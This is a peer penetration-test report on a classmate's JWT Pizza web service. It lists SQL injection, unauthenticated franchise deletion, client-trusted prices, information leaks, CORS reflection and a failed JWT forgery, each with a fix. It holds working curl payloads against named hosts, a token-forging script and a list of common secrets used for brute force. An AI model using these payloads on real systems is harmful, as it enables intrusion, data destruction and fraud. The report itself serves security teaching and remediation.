# Peer Attack Records — Marco Sotomarino's JWT Pizza

**Tester:** Jay Ellis
**Date:** April 13, 2026
**Target:** pizza-service.marcosotomarino.com / pizza.marcosotomarino.com

---

## Attack 1 — SQL Injection via User Update (Privilege Escalation)

| Item           | Result                                                        |
| -------------- | ------------------------------------------------------------- |
| Date           | April 13, 2026                                                |
| Target         | pizza-service.marcosotomarino.com                             |
| Classification | A03 Injection                                                 |
| Severity       | 4                                                             |
| Description    | The `PUT /api/user/:userId` endpoint uses string              |
|                | concatenation to build SQL UPDATE statements. By injecting    |
|                | `admin'-- ` in the `name` field, the WHERE clause is          |
|                | commented out, causing the UPDATE to modify user ID 1         |
|                | instead of the authenticated user (ID 17). The server         |
|                | returned a JWT for user ID 1, proving privilege escalation    |
|                | from a regular diner account to another user's identity.      |
|                | Error-based injection also revealed the full SQL query         |
|                | structure, table names, column names, and internal file        |
|                | paths through stack traces.                                   |
| Images         | See below                                                     |
| Corrections    | Use parameterized queries (`?` placeholders) in               |
|                | `database.js:updateUser()`. Never concatenate user input      |
|                | into SQL strings. Disable stack trace exposure in             |
|                | production error responses.                                   |

**Payload — SQL comment injection in name field:**

```bash
curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/17" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"test@test.com","name":"admin'\''-- "}'
```

**Response (JWT for user ID 1 returned — privilege escalation):**

```json
{
  "user": {
    "id": 1,
    "name": "admin",
    "email": "test@test.com",
    "roles": [{ "role": "diner" }]
  },
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwibmFtZSI6ImFkbWluIiwiZW1haWwiOiJ0ZXN0QHRlc3QuY29tIiwicm9sZXMiOlt7InJvbGUiOiJkaW5lciJ9XSwiaWF0IjoxNzc2MDY5NzI0fQ.f7wFJv46gud3_QIrGDTU4sUqQH1gA6_7iDHl2R8Tz60"
}
```

> Authenticated as user ID 17 (pentest2, diner) but received a JWT for user ID 1.
> The SQL comment (`-- `) truncated the WHERE clause, causing the UPDATE to hit
> the first row in the table instead of the targeted user.

**Error-based injection — reveals SQL structure:**

```bash
curl -s -X PUT "https://pizza-service.marcosotomarino.com/api/user/17" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"x'\'' UNION SELECT id,name,email,password FROM user WHERE '\''1'\''='\''1","password":"test"}'
```

**Response (SQL structure leaked):**

```json
{
  "message": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT id,name,email,password FROM user WHERE '1'='1' WHERE id=17' at line 1",
  "stack": "Error: You have an error in your SQL syntax...\n    at PromiseConnection.execute (/app/node_modules/mysql2/lib/promise/connection.js:47:22)\n    at DB.query (/app/src/database/database.js:475:40)\n    at DB.updateUser (/app/src/database/database.js:143:20)..."
}
```

> Reveals: MySQL database, table name `user`, column names (`id`, `name`, `email`,
> `password`), file paths (`/app/src/database/database.js:475`), and confirms
> unparameterized queries via `PromiseConnection.execute`.

---

## Attack 2 — Unauthenticated Franchise Deletion

| Item           | Result                                                        |
| -------------- | ------------------------------------------------------------- |
| Date           | April 13, 2026                                                |
| Target         | pizza-service.marcosotomarino.com                             |
| Classification | A01 Broken Access Control                                     |
| Severity       | 4                                                             |
| Description    | The `DELETE /api/franchise/:franchiseId` endpoint has no       |
|                | authentication middleware. Sent a DELETE request to            |
|                | franchise ID 3 ("Provo") with absolutely no Authorization     |
|                | header. The server returned 200 OK and deleted the            |
|                | franchise. Any anonymous user on the internet can destroy     |
|                | business data. Notably, `POST /api/franchise` DOES require    |
|                | auth + admin role (403), so only the DELETE is unprotected.   |
| Images         | See below                                                     |
| Corrections    | Add `authRouter.authenticateToken` middleware and an admin     |
|                | role check to the DELETE `/api/franchise/:franchiseId`        |
|                | route in `franchiseRouter.js`.                                |

**Franchises before attack:**

```json
{
  "franchises": [
    { "id": 1, "name": "My Pizza Franchise", "stores": [{ "id": 1, "name": "Main Store" }] },
    { "id": 3, "name": "Provo", "stores": [] },
    { "id": 2, "name": "SLC", "stores": [] }
  ],
  "more": false
}
```

**Attack — DELETE with NO authentication:**

```bash
curl -s -X DELETE https://pizza-service.marcosotomarino.com/api/franchise/3 \
  -w "\nHTTP_CODE: %{http_code}"
```

**Response:**

```
{"message":"franchise deleted"}
HTTP_CODE: 200
```

**Franchises after attack:**

```json
{
  "franchises": [
    { "id": 1, "name": "My Pizza Franchise", "stores": [{ "id": 1, "name": "Main Store" }] },
    { "id": 2, "name": "SLC", "stores": [] }
  ],
  "more": false
}
```

> Franchise "Provo" (ID 3) is gone. No login, no token, no credentials required.

---

## Attack 3 — Order Pizza for $0 and Negative Prices

| Item           | Result                                                        |
| -------------- | ------------------------------------------------------------- |
| Date           | April 13, 2026                                                |
| Target         | pizza-service.marcosotomarino.com                             |
| Classification | A04 Insecure Design                                           |
| Severity       | 3                                                             |
| Description    | The server accepts order prices directly from the client      |
|                | without validating against the menu database. Submitted an    |
|                | order for a Veggie pizza at price 0.0001 (real price:         |
|                | 0.0038) and the order was accepted. The pizza factory         |
|                | issued a valid verification JWT. Also tested with a           |
|                | negative price of -100, which was also accepted. In a real    |
|                | system, negative prices could credit money to the attacker.   |
| Images         | See below                                                     |
| Corrections    | Server-side price validation: look up the actual price from   |
|                | the `menu` table using the `menuId` and ignore the            |
|                | client-supplied `price` field. Reject negative and zero       |
|                | prices.                                                       |

**Menu shows real prices:**

```json
[
  { "id": 2, "title": "Veggie",          "price": 0.0038 },
  { "id": 3, "title": "Margarita",       "price": 0.0014 },
  { "id": 4, "title": "Crusty",          "price": 0.0024 },
  { "id": 5, "title": "Charred Leopard", "price": 0.005  },
  { "id": 6, "title": "Pepperoni",       "price": 0.0042 }
]
```

**Attack 3a — Near-zero price:**

```bash
curl -s -X POST https://pizza-service.marcosotomarino.com/api/order \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"franchiseId":1,"storeId":1,"items":[{"menuId":2,"description":"Veggie","price":0.0001}]}'
```

**Response (order accepted at fraudulent price):**

```json
{
  "order": {
    "franchiseId": 1,
    "storeId": 1,
    "items": [{ "menuId": 2, "description": "Veggie", "price": 0.0001 }],
    "id": 438
  },
  "jwt": "eyJpYXQiOjE3NzYwNjk3NDAsImV4cCI6MTc3NjE1NjE0MCwiaXNzIjoiY3MzMjkuY2xpY2siLCJhbGciOiJSUzI1NiIsImtpZCI6Ik9TcF94VzhlM3kwNk1KS3ZIeW9sRFZMaXZXX2hnTWxhcFZSUVFQVndiY0UifQ..."
}
```

**Attack 3b — Negative price:**

```bash
curl -s -X POST https://pizza-service.marcosotomarino.com/api/order \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"franchiseId":1,"storeId":1,"items":[{"menuId":2,"description":"Veggie","price":-100}]}'
```

**Response (negative price accepted):**

```json
{
  "order": {
    "franchiseId": 1,
    "storeId": 1,
    "items": [{ "menuId": 2, "description": "Veggie", "price": -100 }],
    "id": 439
  },
  "jwt": "eyJpYXQiOjE3NzYwNzAyMTgsImV4cCI6MTc3NjE1NjYxOCwiaXNzIjoiY3MzMjkuY2xpY2siLCJhbGciOiJSUzI1NiIsImtpZCI6Ik9TcF94VzhlM3kwNk1KS3ZIeW9sRFZMaXZXX2hnTWxhcFZSUVFQVndiY0UifQ..."
}
```

> Both orders were fully processed and the pizza factory issued valid signed JWTs
> for each. An attacker can order unlimited free pizza or even generate credits
> with negative prices.

---

## Attack 4 — Information Disclosure & Security Misconfiguration

| Item           | Result                                                        |
| -------------- | ------------------------------------------------------------- |
| Date           | April 13, 2026                                                |
| Target         | pizza-service.marcosotomarino.com                             |
| Classification | A05 Security Misconfiguration                                 |
| Severity       | 2                                                             |
| Description    | Multiple misconfiguration issues leak internal architecture   |
|                | details. The `/api/docs` endpoint publicly exposes the AWS    |
|                | RDS database hostname. All error responses include full        |
|                | Node.js stack traces revealing file paths, module versions,   |
|                | and application structure. The server exposes                  |
|                | `X-Powered-By: Express` and is missing all standard           |
|                | security headers (CSP, HSTS, X-Frame-Options). CORS is        |
|                | configured to reflect any origin with `credentials: true`,    |
|                | allowing cross-origin credential theft from any website.      |
| Images         | See below                                                     |
| Corrections    | 1) Remove DB hostname from `/api/docs`. 2) Set               |
|                | `NODE_ENV=production` and strip `stack` from error            |
|                | responses. 3) Remove `X-Powered-By` header. 4) Add CSP,      |
|                | HSTS, X-Frame-Options headers. 5) Configure CORS to           |
|                | allow only the production frontend origin.                    |

**4a. Database hostname leaked in /api/docs:**

```bash
curl -s https://pizza-service.marcosotomarino.com/api/docs | grep -o '"db":"[^"]*"'
```

```
"db":"jwt-pizza-db.csdC8skiue7b.us-east-1.rds.amazonaws.com"
```

> Reveals AWS RDS instance name, region (us-east-1), and specific identifier.

**4b. Stack trace leaked on malformed JSON:**

```bash
curl -s -X PUT https://pizza-service.marcosotomarino.com/api/auth \
  -H 'Content-Type: application/json' \
  -d 'not json'
```

```json
{
  "message": "Unexpected token 'n', \"not json\" is not valid JSON",
  "stack": "SyntaxError: Unexpected token 'n', \"not json\" is not valid JSON\n    at JSON.parse (<anonymous>)\n    at createStrictSyntaxError (/app/node_modules/body-parser/lib/types/json.js:169:10)\n    at parse (/app/node_modules/body-parser/lib/types/json.js:86:15)\n    at /app/node_modules/body-parser/lib/read.js:128:18\n    at AsyncResource.runInAsyncScope (node:async_hooks:206:9)\n    at invokeCallback (/app/node_modules/raw-body/index.js:238:16)\n    at done (/app/node_modules/raw-body/index.js:227:7)\n    at IncomingMessage.onEnd (/app/node_modules/raw-body/index.js:287:7)\n    at IncomingMessage.emit (node:events:524:28)\n    at endReadableNT (node:internal/streams/readable:1698:12)"
}
```

> Reveals: `/app/` container root, Node.js runtime, body-parser and raw-body
> module versions, internal file paths and line numbers.

**4c. Stack trace leaked on auth failure:**

```bash
curl -s -X PUT https://pizza-service.marcosotomarino.com/api/auth \
  -H 'Content-Type: application/json' \
  -d '{"email":"doesnotexist@nowhere.com","password":"anything"}'
```

```json
{
  "message": "unknown user",
  "stack": "Error: unknown user\n    at DB.getUser (/app/src/database/database.js:107:15)\n    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)\n    at async /app/src/routes/authRouter.js:110:18"
}
```

> Reveals: `/app/src/database/database.js:107`, `/app/src/routes/authRouter.js:110`.

**4d. X-Powered-By and missing security headers:**

```bash
curl -sI https://pizza-service.marcosotomarino.com/
```

```
HTTP/2 200
x-powered-by: Express
access-control-allow-origin: *
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS
access-control-allow-headers: Content-Type, Authorization
access-control-allow-credentials: true
```

> `X-Powered-By: Express` present. No `Content-Security-Policy`,
> `Strict-Transport-Security`, `X-Frame-Options`, or `X-Content-Type-Options`.

**4e. CORS reflects arbitrary origin:**

```bash
curl -sI https://pizza-service.marcosotomarino.com/api/franchise \
  -H "Origin: https://evil-attacker.com"
```

```
access-control-allow-origin: https://evil-attacker.com
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS
access-control-allow-headers: Content-Type, Authorization
access-control-allow-credentials: true
```

> The attacker's origin is echoed back verbatim with credentials allowed. Any
> malicious website can make authenticated cross-origin requests to the API.

---

## Attack 5 — JWT Forgery Attempt (Default Secret)

| Item           | Result                                                        |
| -------------- | ------------------------------------------------------------- |
| Date           | April 13, 2026                                                |
| Target         | pizza-service.marcosotomarino.com                             |
| Classification | A02 Cryptographic Failures                                    |
| Severity       | 0                                                             |
| Description    | The source code `.env` file contains                          |
|                | `JWT_SECRET=dev-secret-key-change-in-production`. Attempted   |
|                | to forge an admin JWT using this default secret and also      |
|                | tried 10 other common secrets (secret, password, changeme,   |
|                | pizza, jwt-secret, etc.). All forged tokens were rejected     |
|                | by the production server, confirming Marco changed the JWT    |
|                | secret for production. However, JWT tokens still have no      |
|                | `exp` claim — tokens never expire, meaning a stolen token     |
|                | is valid forever.                                             |
| Images         | See below                                                     |
| Corrections    | 1) Remove the default secret from `.env` — use                |
|                | environment-variable-only injection. 2) Add `.env` to         |
|                | `.gitignore`. 3) Add JWT expiration (`expiresIn: '1h'`)      |
|                | to `jwt.sign()` calls.                                        |

**Forged admin token with default secret:**

```bash
cd jwt-pizza-service
FORGED=$(node -e "
  const jwt = require('jsonwebtoken');
  const token = jwt.sign(
    {id:17, name:'pentest2', email:'pentest2@test.com', roles:[{role:'admin'}]},
    'dev-secret-key-change-in-production'
  );
  console.log(token);
")
```

**Test forged token:**

```bash
curl -s https://pizza-service.marcosotomarino.com/api/order \
  -H "Authorization: Bearer $FORGED"
```

```json
{ "message": "unauthorized" }
```

**Brute force of 10 common secrets — all rejected:**

```
Secret 'secret':      {"message":"unauthorized"}
Secret 'jwt-secret':  {"message":"unauthorized"}
Secret 'pizza':       {"message":"unauthorized"}
Secret 'password':    {"message":"unauthorized"}
Secret 'changeme':    {"message":"unauthorized"}
Secret 'jwtsecret':   {"message":"unauthorized"}
Secret 'pizzasecret': {"message":"unauthorized"}
Secret 'cs329':       {"message":"unauthorized"}
Secret 'jwt_secret':  {"message":"unauthorized"}
Secret 'supersecret': {"message":"unauthorized"}
```

> Marco changed the JWT secret. Forgery is not exploitable. However, tokens still
> lack an `exp` claim — decoded JWT payload shows `iat` only:

```json
{
  "id": 17,
  "name": "pentest2",
  "email": "pentest2@test.com",
  "roles": [{ "role": "diner" }],
  "iat": 1776069642
}
```

> No `exp` field. A stolen token is valid indefinitely.

---

## Summary of Findings

| #   | Attack                          | OWASP Category              | Severity | Exploitable? |
| --- | ------------------------------- | --------------------------- | -------- | ------------ |
| 1   | SQL Injection (Priv. Esc.)      | A03 Injection               | 4        | YES          |
| 2   | Unauth Franchise Deletion       | A01 Broken Access Control   | 4        | YES          |
| 3   | Zero/Negative Price Orders      | A04 Insecure Design         | 3        | YES          |
| 4   | Info Disclosure + Misconfig     | A05 Security Misconfiguration | 2      | YES          |
| 5   | JWT Forgery (Default Secret)    | A02 Cryptographic Failures  | 0        | NO (patched) |

## What Marco Patched vs. What Remains Open

### Patched (credit to Marco)

1. **Default admin credentials** — All default accounts (`a@jwt.com`, `d@jwt.com`,
   `f@jwt.com`, `t@jwt.com`) removed. Default credential attacks fail.
2. **Error message enumeration** — Both wrong password and unknown user return the
   same "unknown user" error. User enumeration via error content is blocked.
3. **JWT secret** — Changed from the default `dev-secret-key-change-in-production`.
   Forgery with the default and 10 common secrets all rejected.

### Still Vulnerable

1. **SQL Injection** — `PUT /api/user` still uses string concatenation. Allows
   privilege escalation and data extraction.
2. **Unauthenticated Franchise Deletion** — `DELETE /api/franchise/:id` has no
   auth middleware at all.
3. **Client-Side Price Trust** — Server accepts any price including zero and
   negative values without validation.
4. **Stack Trace Leakage** — All errors return full Node.js stack traces with
   internal file paths and module versions.
5. **Database Hostname Exposed** — `/api/docs` config section leaks the full
   RDS hostname.
6. **CORS Origin Reflection** — Any origin reflected with `credentials: true`.
7. **No JWT Expiry** — Tokens have no `exp` claim and never expire.
8. **Missing Security Headers** — No CSP, HSTS, X-Frame-Options on backend
   or frontend. `X-Powered-By: Express` still present.
9. **No Rate Limiting** — Login, registration, and order endpoints accept
   unlimited requests with no throttling or lockout.
